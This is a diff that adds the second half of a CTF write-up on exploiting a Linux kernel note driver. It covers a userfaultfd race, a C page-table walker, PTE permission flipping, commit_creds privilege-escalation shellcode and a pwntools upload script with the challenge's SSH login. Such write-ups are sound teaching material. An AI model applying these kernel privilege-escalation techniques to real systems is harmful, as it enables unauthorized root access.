@@ -523,3 +523,208 @@ clean:
 ```
 
 There may be a subtle difference between the offsets, but we can adjust these minimal differences via inspection with a debugger.
+
+## Using userfaultfd to make races reliable
+
+|               thread 1              |          thread 2         |
+|:-----------------------------------:|:-------------------------:|
+|       edit note 0 (size 0xf0)       |            idle           |
+|            copy_from_user           |            idle           |
+|                 idle                |      delete all notes     |
+|                 idle                | add note 0 with size 0x20 |
+|                 idle                | add note 1 with size 0x20 |
+| continue edit of note 0 (size 0xf0) |            idle           |
+
+Remember that this must happen, at the exact order. We can hope that things will work out for us and try again and again, but it's not a reliable solution. I did some searching about making races reliable, and came across [this](https://blog.lizzie.io/using-userfaultfd.html) great article.
+
+The basic idea is to use a userfault object, which is an API used to handle page faults in userspace. The interesting thing is that it can handle page faults in kernel code as well. So, if I trigger a page fault in `copy_from_user` or `copy_to_user`, I can make that kernel thread halt, do some things, and continue execution in that thread. This is exactly what I need!
+
+The usage is kinda complicated, but simply it can be summarized into three parts.
+
+```
+1. create a userfault fd and tell which addresses it should handle
+2. create a thread that will cause the page fault
+3. create a poll-loop that will handle the page fault via userfaultfd created in step 1
+```
+
+I'll be going through the exact process in another entry, since it's kinda compilcated to shove it in here. userfaultfd is a very interesting feature. However, userfaulfd itself does not introduce any vulnerabilities. The cause of the vulnerability was the usage of `unlocked_ioctl`, and userfaultfd is just there to help my race become exploitable.
+
+So, my plan is this
+
+```
+0. create a length 0xf0 note
+1. create a userfault fd that looks for page faults at address 0xdead000
+2. edit the note created in 0, but make sure the userspace pointer points to an mmapped page at address 0xdead000 (this can be done via MAP_FIXED option)
+3. now the editing thread will sleep until we handle the fault
+4. delete all notes and create 2 notes with size 0x20
+5. handle the page fault, and edit is done now => buffer overflow
+6. game over!
+```
+
+## Getting the flag
+
+Now we have a few (actually most) known addresses and arbitrary read write. It seems that it's over, but I wasted a lot of time thinking what to do. I tried the `cred_struct` spraying mentioned before but it wasn't that reliable. (about 1/10 success rate?)
+
+Then I decided to think again, iterating over what I did over the last 24 hours. I realized that I haven't resolved what `key` is. It's definitely a pointer, but what is it pointing to?
+
+Then I realized that I could use the method of compiling a kernel module to find offsets of complex structures. With a bunch of trial and error, I could decisively conclude that The value `key` is equivalent to `task_struct.mm->pgd` where `mm` is a `struct mm_struct` and `pgd` is a pointer. Basically the key was the highest level page table, also known as the name `page directory`. 
+
+Sometimes in CTFs, unlike in real-world challenges thinking about the author's intended solution is a shortcut. I wondered why someone would use a page directory address as an encrpytion key. The only reasonable answer to that was that I should corrupt/forge the paging structures. 
+
+How can I profit from corrupting page tables? Remember what I said about page permissions in page table entries? If I can manipulate bits representing R/W/X permissions in page table entires, I can create an RWX page and get ring0 arbitrary code execution very easily. This idea is very similar to `mprotect` ROP stagers in userspace exploitation.
+
+So I created some code to walk page tables, and with some trial and error I made it work.
+```c
+unsigned long pageTableWalk(unsigned long pgdir, unsigned long vaddr) {
+	unsigned long index1 = (vaddr >> 39) & 0x1ff;
+	unsigned long index2 = (vaddr >> 30) & 0x1ff;
+	unsigned long index3 = (vaddr >> 21) & 0x1ff;
+	unsigned long index4 = (vaddr >> 12) & 0x1ff;
+
+	printf("index1: %lx, index2: %lx, index3: %lx index4: %lx\n", index1, index2, index3, index4);
+	
+	unsigned long lv1 = read64(pgdir + index1*8);
+	if (!lv1) {
+		printf("[!] lv1 is invalid\n");
+		exit(-1);
+	}
+	printf("lv1: %lx\n", lv1);
+	unsigned long lv2 = read64(((lv1 >> 12) << 12) + pageOffsetBase + index2*8);
+	if (!lv2) {
+		printf("[!] lv2 is invalid\n");
+		exit(-1);
+	}
+	printf("lv2: %lx\n", lv2);
+	
+	unsigned long lv3 = read64(((lv2 >> 12) << 12) + pageOffsetBase + index3*8);
+	if (!lv3) {
+		printf("[!] lv3 is invalid\n");
+		exit(-1);
+	}
+	printf("lv3: %lx\n", lv3);
+
+	unsigned long lv4 = read64(((lv3 >> 12) << 12) + pageOffsetBase + index4*8);
+	if (!lv4) {
+		printf("[!] lv3 is invalid\n");
+		exit(-1);
+	}
+	printf("lv4: %lx\n", lv4);
+	
+	unsigned long vaddr_alias = ((lv4 >> 12) << 12) + pageOffsetBase;
+	printf("vaddr alias page: %p\n", (void *)vaddr_alias);
+	unsigned long pte_addr = ((lv3 >> 12) << 12) + pageOffsetBase + index4*8;
+	printf("pte address: %p\n", (void *)pte_addr);
+	
+	return pte_addr;
+}
+```
+
+One thing to notice is that each entry contains the physical address for the lower level page table, so we must add `page_offset_base` to find calculate the virtual address (alias page) for that physical frame. The code above returns the virtual address to the page table entry, so manipulating bits of that entry will change the permissions of that address.
+
+The address I decided to play with is the module base. Originally it only has the EXEC/READ bits, but I give it WRITE as well. This can be done by setting the second least significant bit.
+
+```c
+unsigned long pte_addr = pageTableWalk(key, moduleBase);
+unsigned long default_pte = read64(pte_addr);
+write64(pte_addr, default_pte|2);
+```
+
+Now we can overwrite codes of the `open` and `ioctl` handlers. However for arbitrary writes `ioctl` is required so I make sure that `open` jumps to a code below `ioctl`, where I write the `commit_cred(prepare_kernel_creds(0))` shellcode. We don't need to return about returning to user safely, if we make sure the `open` handler returns in the same way its original code did.
+
+Also, the addresses for the symbols `commit_cred` and `prepare_kernel_creds` is resolved dynamically during the exploit, so we can't hard-code shellcode into our exploit. So I 'compiled' it. (sorry to all the compilers in the world...)
+
+```c
+void commit_creds_and_return() {
+	asm volatile ("xor %rdi, %rdi");
+	asm volatile ("mov $0xcccccccccccccccc, %rax");
+	asm volatile ("call %rax");
+	asm volatile ("mov %rax, %rdi");
+	asm volatile ("mov $0xdddddddddddddddd, %rax");
+	asm volatile ("call %rax");
+}
+
+char shellcode[0x1000];
+	memcpy(shellcode, commit_creds_and_return, 0xff);
+	for(int i = 0; i < 0xff; i++) {
+		unsigned long *pppp = &shellcode[i];
+		if (*pppp == 0xcccccccccccccccc) {
+			printf("[*] patched prepare_kernel_cred\n");
+			*pppp = prepare_kernel_cred;
+		}
+		if (*pppp == 0xdddddddddddddddd) {
+			printf("[*] patched commit_creds\n");
+			*pppp = commit_creds;
+		}
+	}
+```
+
+Now calling `open` on `/dev/note` will give us root, and we can get the flag.
+
+## Final shit to overcome
+
+I statically compiled my exploit and used a script to upload my binary. Bascially it gzip compresses my exploit, fragments it to pieces of size 800, b64 encodes it and sends it using `echo` and `cat`. Now, my original exploit was huge, taking about 500 chunks. The script timed out at about 300 chunks.
+
+I thought that `pthread` was the culprit, and replaced `pthread` with `clone`. It reduced to about 400?
+
+Then I applied some gcc optimiziation flags (strip symbols, size optimization) but it still was over 400.
+
+I spent about 5~6 hours moaning about this obstacle. Then, I remembered a pwnable challenge that I read a [write-up](https://thekidofarcrania.gitlab.io/2019/06/13/0ctf19-finals/) on. So I thought I should compile my binary with uclibc. 
+
+```
+#!/usr/bin/env python2
+from pwn import *
+
+def send_command(cmd, print_cmd = True, print_resp = False):
+	if print_cmd:
+		log.info(cmd)
+
+	p.sendlineafter("$", cmd)
+	resp = p.recvuntil("$")
+
+	if print_resp:
+		log.info(resp)
+
+	p.unrecv("$")
+	return resp
+
+def send_file(name):
+	file = read(name)
+	f = b64e(file)
+
+	send_command("rm /home/note/a.gz.b64")
+	send_command("rm /home/note/a.gz")
+	send_command("rm /home/note/a")
+
+	size = 800
+	for i in range(len(f)/size + 1):
+		log.info("Sending chunk {}/{}".format(i, len(f)/size))
+		send_command("echo -n '{}'>>/home/note/a.gz.b64".format(f[i*size:(i+1)*size]), False)
+
+	send_command("cat /home/note/a.gz.b64 | base64 -d > /home/note/a.gz")
+	send_command("gzip -d /home/note/a.gz")
+	send_command("chmod +x /home/note/a")
+
+def exploit():
+	send_file("exploit.gz")
+	#send_command("/home/note/a")
+	p.sendline("/home/note/a")
+	p.interactive()
+
+if __name__ == "__main__":
+
+	#context.log_level = 'debug'
+	s = ssh(host="krazynote-3.balsnctf.com", port=54321, user="knote", password="knote", timeout=5)
+	p = s.shell('/bin/sh')
+	#p = process("./run.sh")
+	exploit()
+
+```
+
+Compiling with uclibc is a bit complicated, but I just downloaded the uclibc build system, `chroot`ed into it, and compiled it. It worked brilliantly. The exploit shrinked to about 35 chunks, without stripping or any sort of optimization. 
+
+## Overall
+This was my first time doing a linux kernel exploit in a CTF. I learned a lot of things I only knew theoretically such as memory management, kernel memory protections, and userfaultfd.
+
+At first I tried to use a technique known as `ret2dir` but I was afraid it wouldn't work, as I know that physmap pages are not RWX anymore. I should do some research about this as well.
+
+Thanks for the Balsn CTF team for making a very decent kernel pwnable.
